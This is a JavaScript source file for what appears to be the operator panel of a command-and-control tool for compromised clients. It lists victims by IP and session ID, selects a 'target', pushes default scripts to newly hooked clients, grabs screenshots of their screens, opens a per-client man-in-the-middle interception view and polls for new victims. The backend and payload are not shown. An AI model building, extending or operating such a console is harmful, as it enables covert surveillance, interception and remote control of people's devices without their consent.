var clients = {}
var currentClient = null
var currentClientSid = null
var initializedClients = {}

function mitmButtonIdForSid(sid) {
    return `mitmButton-${sid.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
}

async function loadClientList() {
    try {
        const data = await sendConsole('list');
        clients = JSON.parse(data.text);

        const clientList = document.getElementById('clientList');
        clientList.innerHTML = '';

        for (const index in clients) {
            const client = clients[index];
            const item = document.createElement('div');
            item.className = `client-item ${currentClientSid === client.sid ? 'active' : ''}`;

            item.innerHTML = `
                <div class="client-info">
                    <span class="ip">${client.ip}</span>
                    <span class="sid">SID: ${client.sid.substring(0, 8)}...</span>
                </div>
                <div class="client-actions">
                    <button id="${mitmButtonIdForSid(client.sid)}" class="btn-mitm" disabled="" onclick="window.open('${client.mitmUrl}', '_blank'); event.stopPropagation();">MITM</button>
                </div>
            `;

            item.onclick = () => selectClient(index);
            clientList.appendChild(item);
        }

        if (currentClientSid) {
            const selectedExists = Object.values(clients).some(c => c.sid === currentClientSid);
            if (!selectedExists) {
                currentClient = null;
                currentClientSid = null;
                document.getElementById('terminalPrompt').textContent = 'no-target@console:~$';
                document.getElementById('previewStatus').textContent = 'Target: disconnected';
            }
        }
    } catch (e) {
        console.error("Failed to load clients", e);
    }
}

async function selectClient(index) {
    const client = clients[index];
    if (!client) {
        return;
    }

    currentClient = index;
    currentClientSid = client.sid;
    // Update UI active state
    const shortSid = client.sid.substring(0, 8);
    document.getElementById('terminalPrompt').textContent = `${shortSid}@${client.ip}:~$`;
    document.getElementById('previewStatus').textContent = `Target: ${client.ip}`;

    await sendConsole("change " + index);

    if (!initializedClients[currentClientSid]) {
        await loadDefaultScripts();
        initializedClients[currentClientSid] = true;
    }

    await sendConsole("screenshot");
    if (currentClientSid === client.sid) {
        document.getElementById('previewImage').src = `screenshots/${client.sid}.png?t=${Date.now()}`;
        const mitmButton = document.getElementById(mitmButtonIdForSid(client.sid));
        if (mitmButton) {
            mitmButton.disabled = false;
        }
    }
}

function togglePreview() {
    document.getElementById('previewImage').classList.toggle('minimized');
}

let networkTimer = null;

function setNetworkTimer(time) {
    if (networkTimer) {
        clearInterval(networkTimer);
    }
    networkTimer = setInterval(loadClientList, time * 1000);
}

function toggleAutoReload() {
    const toggleButton = document.getElementById('autoReloadToggle');
    const reloadIntervalInput = document.getElementById('reloadInterval');
    if (toggleButton.textContent.includes('OFF')) {
        toggleButton.textContent = 'AUTO-RELOAD: ON';
        reloadIntervalInput.disabled = false;
        setNetworkTimer(parseInt(reloadIntervalInput.value));
    } else {
        toggleButton.textContent = 'AUTO-RELOAD: OFF';
        reloadIntervalInput.disabled = true;
        if (networkTimer) {
            clearInterval(networkTimer);
            networkTimer = null;
        }
    }
}

// Polling and Init
document.addEventListener('DOMContentLoaded', function () {
    loadClientList();
    document.getElementById('previewImage').addEventListener('error', function () {
        this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMTExIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZpbGw9IiM0NDQiIGZvbnQtc2l6ZT0iMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiPm5vIHByZXZpZXcgYXZhaWxhYmxlPC90ZXh0Pjwvc3ZnPg==';
    });
});